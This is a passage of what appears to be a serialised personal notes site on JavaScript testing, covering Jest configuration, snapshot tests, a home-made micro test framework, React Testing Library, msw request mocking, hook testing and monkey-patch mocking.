CSS files, because it's not sure how to handle that imports.\n\nWhat we want to do is to _mock_ the non-JS module (CSS being one) with `moduleNameMapper` option:\n\n```js\n// jest.config.js\nmodule.exports = {\n  moduleNameMapper: {\n    \"\\\\.css$\": require.resolve(\"./test/style-mock.js\"),\n  },\n};\n\n// test/style-mock.js\nmodule.exports = {};\n```\n\n## Support Webpack CSS modules with `identity-obj-proxy`\n\nBy just mocking the styles module with `moduleNameMapper` may result in skipping the `className` property (or, to be precise, the `class` attr) in rendered component (`style-mock.js` is an empty object, so `styles.exampleStyle` is `undefined`.\n\nHowever, it may prove useful to add the `className` to the in-test rendered component for many purposes (eg handling the `classNames` logic).\n\nIf we’re using CSS modules with webpack, then we can improve our `moduleNameMapper` to include the css module property name in our tests using `identity-obj-proxy`:\n\n```js\n// jest.config.js\nmodule.exports = {\n  moduleNameMapper: {\n    \"\\\\.module.css$\": \"identity-obj-proxy\",\n  },\n};\n\n// test/style-mock.js\nmodule.exports = {};\n```\n\n`identity-obj-proxy` returns the path that was accessed to resolve a particular module.\n\n## Snapshot testing\n\nIf we'd like to test if the function returns a serializable value, we could just write:\n\n```js\nimport { getFlyingSuperHeros } from \"../super-heros\";\n\ntest(\"returns returns super heros that can fly\", () =\u003e {\n  const flyingHeros = getFlyingSuperHeros();\n  expect(flyingHeros).toEqual([\n    { name: \"Dynaguy\", powers: [\"disintegration ray\", \"fly\"] },\n    { name: \"Apogee\", powers: [\"gravity control\", \"fly\"] },\n  ]);\n});\n```\n\nHowever, at some point `flyingHeroes` might change, and when it'd happen, we'd need to figure out what changes in the object and to manually change the assertion in test case. This can be _semi-automated_ with _snapshot testing_:\n\n```js\nimport { getFlyingSuperHeros } from \"../super-heros\";\n\ntest(\"returns returns super heros that can fly\", () =\u003e {\n  const flyingHeros = getFlyingSuperHeros();\n  expect(flyingHeros).toMatchSnapshot();\n});\n```\n\nThis will make Jest to create a `\u003ctest-filename\u003e.js.snap` file in which the most recent snapshot will live.\n\nIf the snapshot test fails (because the tested object was changed), we can update the snapshot with `jest -u` (_update_).\n\nWe may also use `toMatchInlineSnapshot` - in this case, the snapshot won't live in a separate file. Jest will pass the snapshot to the test file itself. Using `-u` flag will update the test file assertion.\n\nThis also works with serializing and snapshotting the DOM nodes. In such case it's great to use Prettier, to make sure the real HTML and snapshot HTML are formatted in the same manner.\n\n## Custom Jest Snapshot Serializers\n\nIf we're using some custom UI Library, like `emotion`, we may see strange classes in our snapshots. It'd be more clear to see the clear CSS, instead of weird class names.\n\nThe general rule is to use custom Jest Snapshot Serializer.\n\nFor Emotion, this can be done with `@emotion/jest`:\n\n```js\nmodule.exports = {\n  snapshotSerializers: [\"@emotion/jest/serializer\"],\n};\n```\n\n## Custom Module Resolution with `moduleDirectories`\n\nIf we use Webpack's `resolve.modules` configuration to make common utils accessible across the application without relative paths, we need to emulate similar behavior in Jest. To do that, we use `moduleDirectories` configuration option:\n\n```js\nmodule.exports = {\n  moduleDirectories: [\"node_modules\", path.join(__dirname, \"src\"), \"shared\"],\n};\n```\n\nThis will make Jest to look up the imported modules in `node_modules` and in `./shared`. No more relative paths.\n\n## Configuring Jest to run setup for all tests before actual testing\n\nTo take care of test boilerplate and establish a good testing environment for our tests, we use the `setupFilesAfterEnv` option, together with e.g. `@testing-library/jest-dom`.\n\n```js\n// jest.config.js\nmodule.exports = {\n  setupFilesAfterEnv: [\"@testing-library/jest-dom/extend-expect\"],\n};\n```\n\nNote: `@testing-library/jest-dom/extend-expect` is a _script_. It could be any other boilerplate setup script out there.\n\n## Watch Mode\n\nJust use `jest --watch`. Preferably in `npm` script (eg. `test:watch`).\n\nIt uses `git` working copy to determine what files have changed.\n\nInteractive Snapshots (`i`) are quite useful. It's also possible to filter by filename or test description (`p` and `t`).\n\n### `--watchAll`\n\n`jest --watchAll` will open `jest` in watch mode, but will run **all tests** every time any test file changes.\n\nIt's possible to make Jest to automatically run in watch mode in development environment and in _normal_ mode if it's in CI with `is-ci-cli` npm package:\n\n```json\n// package.json\n{\n  \"scripts\": {\n    \"test\": \"is-ci test:coverage test:watch\",\n    \"test:coverage\": \"...\",\n    \"test:watch\": \"...\"\n  }\n}\n```\n\n## Connecting Jest to Node.js Debugger/Chrome DevTools\n\nBy default using the `debugger` keyword won't do anything. To run tests with Node.js debugger, we need:\n\n```sh\nnode --inspect-brk \u003cpath_to_jest_binary\u003e --runInBand // inspect break\n```\n\n`--runInBand` makes sure `jest` will run only in one `node` process (`jest` is spawning processes by default to fasten things up, but it may be forced to use one process - helpful for tests debugging).\n\nThen we can connect the debugger with DevTools. The remote sessions available are from chrome://inspect/.\n\n\u003e [!tip] There also should be possible to use NodeJS button in DevTools upper left\n\n## Using different configuration files\n\nLet's say we have that set options differently (e.g. have different `testEnvironment`):\n\n- `jest.common.config.js`\n- `jest.server.config.js`\n- `jest.client.config.js`\n\nTo make sure the different configuration files target different test files, we can set `testMatch` option:\n\n```js\n// jest.server.config.js\nmodule.exports = {\n  // rootDir: \u003cif custom test file is not in `/`\u003e\n  testMatch: \"./__tests__server__/**/*.test.js\",\n};\n```\n\nThen we need to use `jest --config jest.server.config.js`\n\nThis method would need us to maintain lots of `npm scripts`, since it's not possible to run multiple `watch` sessions at once\n\nAllow to run multiple Jest configurations at once (and reduce the complexity of `npm scripts` by the way).\n\n```js\nmodule.exports = {\n  ...require(\"./jest.common.config.js\"),\n  /* ... */\n  projects: [\"./jest.client.js\", \"./jest.server.js\"],\n};\n```\n\n\u003e [!tip] The _project_ configurations can use `displayName` option to differentiate the output.\n\n### Checking out the configuration\n\nTo display the whole resolved configuration use `jest --config`. The `globalConfig` states the configuration in the root `jest.config.js` file. It'll list also other options that **should be** configured in root config.\n\n## Run ESLint with Jest\n\nIt's possible to change the `runner` which Jest will use - by default it uses `jest-runner`, but we can use e.g. `jest-runner-eslint` to lint the code that'll run `eslint` during evaluation of the project state through `yarn test`.\n\nThis may prove useful when it comes to organize the toolkit around the project especially when it comes to bigger, legacy projects (e.g. ones that weren't linted before, and we want to lint only the code that we changed - improving the code quality gradually).\n\n## Test specific projects in Watch Mode\n\nWith `jest-watch-select-projects` plugin it's possible to specify which projects should be tested in `jest --watch`, similarly to how we select files for current tests run.\n\n```js\nmodule.exports: {\n    watchPlugins: ['jest-watch-select-projects']\n}\n```\n\n## Filtering tests ran with Typeahead support\n\n\u003e [!tip] Typeahead is similar of Intellisense, but non-proprietary\n\nThanks to `jest-watch-typeahead` plugins it's possible to add patternmatching to the tests filtering:\n\n```js\nmodule.exports: {\n    watchPlugins: ['jest-watch-typeahead/filename', 'jest-watch-typeahead/testname']\n}\n```\n\n## Run only relevant tests on Git commit hook\n\n`husky` and `lint-staged` allow to configure the git hook to run tests only\n\n```json\n// package.json\n{\n  \"husky\": {\n    \"hooks\": {\n      \"pre-commit\": \"lint-staged \u0026\u0026 ...\"\n    }\n  },\n  \"lint-staged\": {\n    \"**/*.+(js|json|css|html|md)\": [\n      \"prettier\",\n      \"jest --findRelatedTests\", // \u003c-- This\n      \"git add\"\n    ]\n  }\n}\n```\n\n`jest --findRelatedTests` will find tests that are related to the files defined in `lint-staged`.\n","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/development/testing-javascript/cypress/":{"title":"Testing with Cypress","content":"","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/development/testing-javascript/cypress/configuring-cypress":{"title":"Fundamentals of testing with Cypress and Testing Library","content":"Cypress is a tool for E2E testing.\n\nInternally Cypress is an application that runs natively on the computer, but is installed via `npm`/`yarn`.\n\nTo open Cypress application we use `cypress open`.

In addition of that, the stacktrace would display that the **`Error` occured in the same line it was thrown** (`:9`), whereas we'd like to see the broken sum fn as the reason for failing test (without digging through the stacktrace).\n\nThat's why we should encapsulate and isolate tests:\n\n```ts\nfunction sum(a: number, b: number): number {\n  return a - b; // This fn is broken\n}\n\nfunction subtract(a: number, b: number): number {\n  return a - b;\n}\n\nfunction expect(actual) {\n  return {\n    toBe(expected) {\n      if (actual !== expected) {\n        throw new Error(`${actual} is not equal to ${expected}`);\n      }\n    },\n  };\n}\n\nfunction test(title, callback) {\n  try {\n    callback();\n    console.log(`[ok] ${title}`);\n  } catch (error) {\n    console.error(`[not ok] ${title}`);\n    console.error(error);\n  }\n}\n\ntest(\"sum adds numbers\", () =\u003e {\n  const result = sum(3, 7);\n  expect(result).toBe(10);\n});\n\ntest(\"subtract subtracts numbers\", () =\u003e {\n  const result = subtract(7, 3);\n  expect(result).toBe(4);\n});\n```\n\nTo sum up, the test should allow the developer to **quickly find what's broken**, without having to delve into the stack trace and else.\n\n## Adding a way of testing `async` code\n\nSimple adding `async` to the `callback()` fns and `await`ing for the result would cause the tests to falsely pass and to throw an `UnhandledPromiseRejection` `Error` with the reason of rejection (being our actual broken `sum` fn).\n\n```sh\n$ ts-node test.ts\n[ok] sum adds numbers\n[ok] subtract subtracts numbers\n\nthrow new Error (${actual} is not equal to ${expected});\nError: -4 is not equal to 10\nat [...]\n```\n\nThis is due to the fact that `async () =\u003e { /* test case */ }` returns a `Promise`. The `Error` thrown by the broken `sum()` in the test case causes **rejection of that `Promise`**. The `callback()` call inside `test()` returns that `Promise` without passing the error down. That's why we need to add `async/await` clauses to the `test` fn itself.\n\n```ts\nasync function test(title: string, callback: () =\u003e any) {\n  try {\n    await callback();\n    console.log(`[ok] ${title}`);\n  } catch (error) {\n    console.error(`[not ok] ${title}`);\n    console.error(error);\n  }\n}\n\ntest(\"sum adds numbers\", async () =\u003e {\n  const result = await sum(3, 7);\n  const expected = 10;\n  expect(result).toBe(expected);\n});\n```\n\n## Making test fns global\n\nWe want the test fns to be accessible in different `*.test.ts` files. However, we don't want to have to import the fns in each of test file (many testing frameworks seem to _embrace_ the global functions).\n\nTo make them so we can create a `setup-globals.ts` with the `test` and `expect` fns torn out...\n\n```ts\n// setup-globals.ts\nfunction expect(actual: any) {\n  return {\n    toBe(expected: any) {\n      if (actual !== expected) {\n        throw new Error(`${actual} is not equal to ${expected}`);\n      }\n    },\n  };\n}\n\nasync function test(title: string, callback: () =\u003e any) {\n  try {\n    await callback();\n    console.log(`[ok] ${title}`);\n  } catch (error) {\n    console.error(`[not ok] ${title}`);\n    console.error(error);\n  }\n}\n\nglobal.expect = expect;\nglobal.test = test;\n```\n\n```ts\n// test.ts\nfunction sum(a: number, b: number): number {\n  return a - b;\n}\n\nfunction subtract(a: number, b: number): number {\n  return a - b;\n}\n\ntest(\"sum adds numbers\", async () =\u003e {\n  const result = await sum(3, 7);\n  const expected = 10;\n  expect(result).toBe(expected);\n});\n\ntest(\"subtract subtracts numbers\", () =\u003e {\n  const result = subtract(7, 3);\n  const expected = 4;\n  expect(result).toBe(expected);\n});\n```\n\n...and run the tests in this manner:\n\n```sh\n$ ts-node --require ./setup-globals.ts test.ts\n```\n\nThat being said, we've just created micro, `jest`-like testing framework.\n","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/development/testing-javascript/jest/":{"title":"Testing with Jest","content":"","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/development/testing-javascript/jest/fake-data":{"title":"Using fake data in tests","content":"It's actually better to generate data for tests than hardcoding it.

They are _same_ but `waitFor` offers more possibilities\n\n## Using `jest-dom`\n\n`jest-dom` provides really useful extensions to jest’s built-in assertion library that will make it easier for us to write our test assertions (like `toHaveTextContent`).\n\n```ts\nimport * as React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport \"@testing-library/jest-dom\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest('renders a number input with a label \"Favorite Number\"', () =\u003e {\n  const div = document.createElement(\"div\");\n  ReactDOM.render(\u003cFavoriteNumber /\u003e, div);\n  expect(div.querySelector(\"input\")).toHaveAttribute(\"type\", \"number\");\n  expect(div.querySelector(\"label\")).toHaveTextContent(\"Favorite Number\");\n});\n```\n\n\u003e [!tip] KCD configured the test files to import `@testing-library/*` automatically\n\u003e\n\u003e That's why that import is missing from the examples\n\n## Using DOM Testing Library to write more maintainable tests\n\n```tsx\nimport * as React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport { getQueriesForElement } from \"@testing-library/dom\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest('renders a number input with a label \"Favorite Number\"', () =\u003e {\n  const div = document.createElement(\"div\");\n  ReactDOM.render(\u003cFavoriteNumber /\u003e, div);\n  const { getByLabelText } = getQueriesForElement(div);\n  const input = getByLabelText(/favorite number/i); // /i -\u003e case insensitive\n  expect(input).toHaveAttribute(\"type\", \"number\");\n});\n```\n\n## Using `@testing-library/react` for rendering\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen } from \"@testing-library/react\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest('renders a number input with a label \"Favorite Number\"', () =\u003e {\n  render(\u003cFavoriteNumber /\u003e);\n  const input = screen.getByLabelText(/favorite number/i);\n  expect(input).toHaveAttribute(\"type\", \"number\");\n});\n```\n\n## React Testing Library's `debug` fn\n\n`debug(renderedComponent = null)` will `console.log` the HTML code for all rendered components (unless one is provided as an argument).\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen } from \"@testing-library/react\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest('renders a number input with a label \"Favorite Number\"', () =\u003e {\n  render(\u003cFavoriteNumber /\u003e);\n  const input = screen.getByLabelText(/favorite number/i);\n  expect(input).toHaveAttribute(\"type\", \"number\");\n  screen.debug(); // \u003c-- w/o arg\n  // screen.debug(input); // \u003c-- with arg\n});\n```\n\n## Testing Event Handlers with `userEvent`\n\n`userEvent` fn more closely resebles the way the users interact with tested components than `fireEvent` itself.\n\n`userEvent.type` internally fires a bunch of `fireEvent`s to mimic human behavior. It follows `async/await` pattern.\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen, fireEvent } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest(\"entering an invalid value shows an error message\", async () =\u003e {\n  render(\u003cFavoriteNumber /\u003e);\n  const input = screen.getByLabelText(/favorite number/i);\n  // fireEvent.change(input, {target: {value: '10'}})\n  await userEvent.type(input, \"10\");\n\n  // `FavoriteNumber` contains a `div` with `role=\"alert\"` defined for accessibility purposes\n  expect(screen.getByRole(\"alert\")).toHaveTextContent(/the number is invalid/i);\n});\n```\n\n## Test props updates\n\n```tsx\nimport * as React from \"react\";\nimport user from \"@testing-library/user-event\";\nimport { render, screen } from \"@testing-library/react\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest(\"entering an invalid value shows an error message\", async () =\u003e {\n  const { rerender } = render(\u003cFavoriteNumber /\u003e);\n  const input = screen.getByLabelText(/favorite number/i);\n  await user.type(input, \"10\");\n  expect(screen.getByRole(\"alert\")).toHaveTextContent(/the number is invalid/i);\n  rerender(\u003cFavoriteNumber max={10} /\u003e);\n  expect(screen.queryByRole(\"alert\")).not.toBeInTheDocument();\n});\n```\n\n### The difference between `getBy...` and `queryBy...`\n\n`getBy...` will throw an `Error` if it didn't find queried element. `queryBy...` will return `null` instead.\n\nUsually it's better to use `getBy...` to have a nice error messages in Jest's output, but occasionally assertions using `queryBy...` will be easier to read.\n\n## Test accessibility\n\nNot all of accessibility testing of a web application can be automated, but much of it can be using [jest-axe](https://github.com/nickcolley/jest-axe).\n\n```tsx\nimport \"jest-axe/extend-expect\";\nimport * as React from \"react\";\nimport { render } from \"@testing-library/react\";\nimport { axe } from \"jest-axe\";\n\ntest(\"inaccessible forms fail axe\", async () =\u003e {\n  const { container } = render(\u003cInaccessibleForm /\u003e);\n  const axeResult = await axe(container);\n  expect(() =\u003e expect(axeResult).toHaveNoViolations()).toThrow();\n});\n\ntest(\"accessible forms pass axe\", async () =\u003e {\n  const { container } = render(\u003cAccessibleForm /\u003e);\n  expect(await axe(container)).toHaveNoViolations();\n});\n```\n\n## Test `componentDidCatch` Error Boundary handler\n\n```tsx\nimport * as React from \"react\";\nimport { render } from \"@testing-library/react\";\nimport { reportError } from \"../api\";\nimport { ErrorBoundary } from \"../error-boundary\";\n\njest.mock(\"../api\");\n\nafterEach(() =\u003e {\n  jest.clearAllMocks();\n});\n\nfunction Bomb({ shouldThrow }) {\n  if (shouldThrow) {\n    throw new Error(\"💣\");\n  } else {\n    return null;\n  }\n}\n\ntest(\"calls reportError and renders that there was a problem\", () =\u003e {\n  reportError.mockResolvedValueOnce({ success: true });\n  const { rerender } = render(\n    \u003cErrorBoundary\u003e\n      \u003cBomb /\u003e\n    \u003c/ErrorBoundary\u003e,\n  );\n\n  rerender(\n    \u003cErrorBoundary\u003e\n      \u003cBomb shouldThrow={true} /\u003e\n    \u003c/ErrorBoundary\u003e,\n  );\n\n  const error = expect.any(Error);\n  const info = { componentStack: expect.stringContaining(\"Bomb\") };\n  expect(reportError).toHaveBeenCalledWith(error, info);\n  expect(reportError).toHaveBeenCalledTimes(1);\n\n  expect(console.error).toHaveBeenCalledTimes(2);\n});\n```\n\nIt's possible to suppress `console.error` from the Error Boundary component. Useful for omitting the `console.error` messages in test results, if the formers make the latters messy.\n\n```tsx\nbeforeEach(() =\u003e {\n  jest.spyOn(console, \"error\").mockImplementation(() =\u003e {});\n});\n\nafterEach(() =\u003e {\n  console.error.mockRestore();\n});\n```\n\n### Ensure Error Boundaries can successfully recover from Errors\n\nThanks to `.mockClear()` we can _reset_ how many times the fn was called:\n\n```tsx\ntest(\"calls reportError and renders that there was a problem, then recovers from \", () =\u003e {\n  /* ... */\n\n  // here we are clearing out the mocks\n  console.error.mockClear();\n  mockReportError.mockClear();\n\n  rerender(\n    \u003cErrorBoundary\u003e\n      \u003cBomb /\u003e\n    \u003c/ErrorBoundary\u003e,\n  );\n\n  userEvent.click(screen.getByText(/try again/i));\n\n  expect(mockReportError).not.toHaveBeenCalled();\n  expect(console.error).not.toHaveBeenCalled();\n  expect(screen.queryByRole(\"alert\")).not.toBeInTheDocument();\n  expect(screen.queryByText(/try again/i)).not.toBeInTheDocument();\n});\n```\n\n## Mock `react-transition-group`\n\nGiven the Component:\n\n```tsx\n// hidden-message.tsx\nimport * as React from \"react\";\nimport { CSSTransition } from \"react-transition-group\";\n\nfunction Fade(props) {\n  return (\n    \u003cCSSTransition unmountOnExit timeout={1000} classNames=\"fade\" {...props} /\u003e\n  );\n}\n\nfunction HiddenMessage({ children }) {\n  const [show, setShow] = React.useState(false);\n  const toggle = () =\u003e setShow((s) =\u003e !s);\n  return (\n    \u003cdiv\u003e\n      \u003cbutton onClick={toggle}\u003eToggle\u003c/button\u003e\n      \u003cFade in={show}\u003e\n        \u003cdiv\u003e{children}\u003c/div\u003e\n      \u003c/Fade\u003e\n    \u003c/div\u003e\n  );\n}\n\nexport { HiddenMessage };\n```\n\nIn the case of `react-transition-group`, we don’t want to have to wait `1000ms` until the transition has completed before we can go on with our tests. We can mock `react-transition-group` implementation to do so:\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { HiddenMessage } from \"../hidden-message\";\n\njest.mock(\"react-transition-group\", () =\u003e {\n  return {\n    CSSTransition: (props) =\u003e (props.in ? props.children : null),\n  };\n});\n\ntest(\"shows hidden message when toggle is clicked\", () =\u003e {\n  const myMessage = \"hello world\";\n  render(\u003cHiddenMessage\u003e{myMessage}\u003c/HiddenMessage\u003e);\n  const toggleButton = screen.getByText(/toggle/i);\n  expect(screen.queryByText(myMessage)).not.toBeInTheDocument();\n  userEvent.click(toggleButton);\n  expect(screen.getByText(myMessage)).toBeInTheDocument();\n  userEvent.click(toggleButton);\n  expect(screen.queryByText(myMessage)).not.toBeInTheDocument();\n});\n```\n\nWhen we mock something, we want to make the mock as close to original function as possible.\n\n## Wrappers\n\nWrappers are a nice to have to avoid code repetition:\n\n```tsx\ntest(\"calls reportError and renders that there was a problem\", () =\u003e {\n  // [...]\n  const { rerender } = render(\u003cBomb /\u003e, { wrapper: ErrorBoundary });\n  // [...]\n});\n```\n\n## Mock HTTP with `jest.mock`\n\nIf we have a component that makes HTTP request we want to mock those out for UI unit and integration tests:\n\n```tsx\n// greeting-loader.tsx\n\nimport * as React from \"react\";\nimport { loadGreeting } from \"./api\";\n\nfunction GreetingLoader() {\n  const [greeting, setGreeting] = React.useState\u003cstring\u003e(\"\");\n  async function loadGreetingForInput(e) {\n    e.preventDefault();\n    const { data }: { data: { greeting: string } } = await loadGreeting(\n      e.target.elements.name.value,\n    );\n    setGreeting(data.greeting);\n  }\n  return (\n    \u003cform onSubmit={loadGreetingForInput}\u003e\n      \u003clabel htmlFor=\"name\"\u003eName\u003c/label\u003e\n      \u003cinput id=\"name\" /\u003e\n      \u003cbutton type=\"submit\"\u003eLoad Greeting\u003c/button\u003e\n      \u003cdiv aria-label=\"greeting\"\u003e{greeting}\u003c/div\u003e\n    \u003c/form\u003e\n  );\n}\n\nexport { GreetingLoader };\n```\n\n```tsx\n// greeting-loader.test.ts\n\nimport * as React from \"react\";\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { loadGreeting } from \"../api\";\nimport { GreetingLoader } from \"../greeting-loader\";\n\njest.mock(\"../api\");\n\ntest(\"loads greetings on click\", async () =\u003e {\n  const testGreeting = \"TEST_GREETING\";\n  loadGreeting.mockResolvedValueOnce({ data: { greeting: testGreeting } });\n  render(\u003cGreetingLoader /\u003e);\n\n  const nameInput = screen.getByLabelText(/name/i);\n  const loadButton = screen.getByText(/load/i);\n\n  await userEvent.type(nameInput, \"Mary\");\n  await userEvent.click(loadButton);\n\n  expect(loadGreeting).toHaveBeenCalledWith(\"Mary\");\n  expect(loadGreeting).toHaveBeenCalledTimes(1);\n\n  // waitFor uses `act()` for state updates for us\n  await waitFor(() =\u003e\n    expect(screen.getByLabelText(/greeting/i)).toHaveTextContent(testGreeting),\n  );\n});\n```\n\n## Mocking HTTP with `msw`\n\nIt would be nice addition to make sure that the API module is working properly when testing the components that are interacting with that module.\n\nThat would require us to actually interact with the API, but the requests would be intercepted. To intercept requests we need to setup the `msw` server intercepting them first.\n\nAlso, because the tests are ran in Node.js environment we need to polyfill the `fetch` module with `whatwg-fetch`.\n\n```tsx\nimport \"whatwg-fetch\";\nimport * as React from \"react\";\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { rest } from \"msw\";\nimport { setupServer } from \"msw/node\";\nimport { GreetingLoader } from \"../greeting-loader-01-mocking\";\n\nconst server = setupServer(\n  rest.post(\"/greeting\", (req, res, ctx) =\u003e {\n    return res(ctx.json({ data: { greeting: `Hello ${req.body.subject}` } }));\n  }),\n);\n\nbeforeAll(() =\u003e server.listen({ onUnhandledRequest: \"error\" })); // start the server\nafterAll(() =\u003e server.close());\nafterEach(() =\u003e server.resetHandlers());\n\ntest(\"loads greetings on click\", async () =\u003e {\n  render(\u003cGreetingLoader /\u003e);\n  const nameInput = screen.getByLabelText(/name/i);\n  const loadButton = screen.getByText(/load/i);\n\n  await userEvent.type(nameInput, \"Mary\");\n  await userEvent.click(loadButton);\n  await waitFor(() =\u003e\n    expect(screen.getByLabelText(/greeting/i)).toHaveTextContent(\"Hello Mary\"),\n  );\n});\n```\n\nThe cool part is that if we were to make some sort of mistake, not just in our component, but also in our client request, then we would catch that with this arguably simpler test. We also get a higher coverage.\n\n## Custom `renderComponent` fns to simplify tests\n\nHaving a custom `render[Component]` fn allows to simplify the test code:\n\n```tsx\nfunction renderEditor() {\n  const fakeUser = userBuilder()\n  const utils = render(\u003cEditor user={fakeUser} /\u003e)\n  const fakePost = postBuilder()\n\n  screen.getByLabelText(/title/i).value = fakePost.title\n  screen.getByLabelText(/content/i).value = fakePost.content\n  screen.getByLabelText(/tags/i).value = fakePost.tags.join(', ')\n  const submitButton = screen.getByText(/submit/i)\n  return {\n    ...utils,\n    submitButton,\n    fakeUser,\n    fakePost,\n  }\n}\n\ntest('renders a form with title, content, tags, and a submit button', async () =\u003e {\n  const {submitButton, fakePost, fakeUser} = renderEditor()\n    /* [...] */\n}\n```\n\n## Custom `history` implementation within `react-router`\n\nMocking the `\u003cRedirect /\u003e` component in `react-router` works, but it’s imperfect because we don’t know for sure that the user will be redirected properly.\n\nNormally we'd import `BrowserRouter`, but in tests we import `MemoryRouter` so we can manually control the `history` object.\n\n```tsx\nimport * as React from \"react\";\nimport { MemoryRouter } from \"react-router-dom\";\nimport { render as rtlRender, screen } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { Main } from \"../main\";\n\nfunction render(ui, { route = \"/\", ...renderOptions } = {}) {\n  function Wrapper({ children }) {\n    return \u003cMemoryRouter initialEntries={[route]}\u003e{children}\u003c/MemoryRouter\u003e;\n  }\n  return rtlRender(ui, {\n    wrapper: Wrapper,\n    ...renderOptions,\n  });\n}\n\ntest(\"main renders about and home and I can navigate to those pages\", async () =\u003e {\n  render(\u003cMain /\u003e);\n  expect(screen.getByRole(\"heading\")).toHaveTextContent(/home/i);\n  await userEvent.click(screen.getByText(/about/i));\n  expect(screen.getByRole(\"heading\")).toHaveTextContent(/about/i);\n});\n\ntest(\"landing on a bad page shows no match component\", () =\u003e {\n  render(\u003cMain /\u003e, {\n    route: \"/something-that-does-not-match\",\n  });\n  expect(screen.getByRole(\"heading\")).toHaveTextContent(/404/i);\n});\n```\n\n## Testing the unmounting of the component\n\nLet's assume we have the `Countdown` function component that will cleanup in `useEffect`/`useLayoutEffect`/`componentWillUnmount`.\n\n\u003e [!tip] `testing-library` doesn't care about component type\n\u003e\n\u003e The test case can be the same for both class and function components.\n\n```tsx\nimport { useEffect, useRef, useState } from \"react\";\n\nfunction Countdown() {\n  const [remainingTime, setRemainingTime] = useState(10000);\n  const end = useRef(new Date().getTime() + remainingTime);\n  useEffect(() =\u003e {\n    const interval = setInterval(() =\u003e {\n      const newRemainingTime = end.current - new Date().getTime();\n      if (newRemainingTime \u003c= 0) {\n        clearInterval(interval);\n        setRemainingTime(0);\n      } else {\n        setRemainingTime(newRemainingTime);\n      }\n    });\n    return () =\u003e clearInterval(interval);\n  }, []);\n  return remainingTime;\n}\n\nexport { Countdown };\n```\n\n```tsx\n// countdown.test.tsx\nimport * as React from \"react\";\nimport { render, act } from \"@testing-library/react\";\nimport { Countdown } from \"../countdown\";\n\n// keeping `console.error` out of the way in test output\nbeforeAll(() =\u003e {\n  jest.spyOn(console, \"error\").mockImplementation(() =\u003e {});\n});\n\nafterAll(() =\u003e {\n  console.error.mockRestore();\n});\n\nafterEach(() =\u003e {\n  jest.clearAllMocks();\n  jest.useRealTimers(); // this re-enables normal intervals/timers so the other tests can use them. just in case.\n});\n\ntest(\"does not attempt to set state when unmounted (to prevent memory leaks)\", () =\u003e {\n  jest.useFakeTimers();\n  const { unmount } = render(\u003cCountdown /\u003e);\n  unmount();\n  act(() =\u003e jest.runOnlyPendingTimers());\n  expect(console.error).not.toHaveBeenCalled();\n});\n```\n\nTo simulate unmounting the component, we're using `unmount` from `render` fn.\n\nTo make sure every intervals were cleared properly, we can use `\n`jest.useFakeTimers()`and`jest.runOnlyPendingTimers()`. The former will make sure the timers will run way quicker.\n\nAfter umnounting, we're calling `jest.runOnlyPendingTimers()` to see if there were any non-cleared intervals (we need to wrap it in `act`). 8\n\nWithout proper cleanup in the component, the error would be thrown here (that's why we're expecting errors not to be thrown).\n","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/development/testing-javascript/jest/testing-hooks":{"title":"Testing custom React hooks","content":"Given the hook:\n\n```tsx\n// useCounter.ts\nimport * as React from \"react\";\n\nfunction useCounter({ initialCount = 0, step = 1 } = {}) {\n  const [count, setCount] = React.useState(initialCount);\n  const increment = () =\u003e setCount((c) =\u003e c + step);\n  const decrement = () =\u003e setCount((c) =\u003e c - step);\n  return { count, increment, decrement };\n}\n\nexport { useCounter };\n```\n\nWe need to make sure we're using the hook inside the function component and wrap the hook fn call in an `act` fn, as a callback:\n\n```tsx\n// useCounter.test.tsx\nimport * as React from \"react\";\nimport { render, act } from \"@testing-library/react\";\nimport { useCounter } from \"../use-counter\";\n\ntest(\"exposes the count and increment/decrement functions\", () =\u003e {\n  let result;\n\n  function TestComponent() {\n    result = useCounter();\n    return null;\n  }\n\n  render(\u003cTestComponent /\u003e);\n\n  expect(result.count).toBe(0);\n  act(() =\u003e result.increment());\n  expect(result.count).toBe(1);\n  act(() =\u003e result.decrement());\n  expect(result.count).toBe(0);\n});\n```\n\n\u003e [!tip] Normally you don't need `act` for using Testing Library.\n\u003e\n\u003e All the internal functions are using `act` in their implementation if necessary.\n\n## Using `renderHook`\n\nWe could create a custom `setup` fn to reduce code duplication, but it'd a bit troublesome.

Basically it's overriding an object property (e.g. `utils.getWinner()`) in the test.\n\n```ts\nconst assert = require(\"assert\");\nconst thumbWawr = require(\"../thumbwar\");\nconst utils = require(\"../utils\"); // `utils` is the module we want to mock\n\nconst originalGetWinner = utils.getWinner; // saving the original implementation for cleanup\nutils.getWinner = (p1, p2) =\u003e p1; // here we make sure `.getWinner` will always ensure the first player wins\n\nconst winner = thumbWar(\"Kent C. Dodds\", \"Ken Wheeler\");\nassert.strictEqual(winner, \"Kent C. Dodds\"); // PASS\n\nutils.getWinner = originalGetWinner; // cleanup\n```\n\n\u003e [!danger] In ES modules monkey patching does not work.\n\n### Cleanup\n\nImportant thing in testing is to clean up after the mocking in the test case, so the other cases may use the original module again or mock it in a different way.\n\nIn this test case we reassign the real function, exported from the `utils.ts` back to `getWinner`.\n\n## Ensuring fns are called properly with mocks\n\nWhen writing tests and mocking dependencies, we want to verify that the function was called correctly, by tracking how often the function was called and what arguments it was called with. This is to ensure the usage of `utils.getWinner` in `thumbWar` implementation is 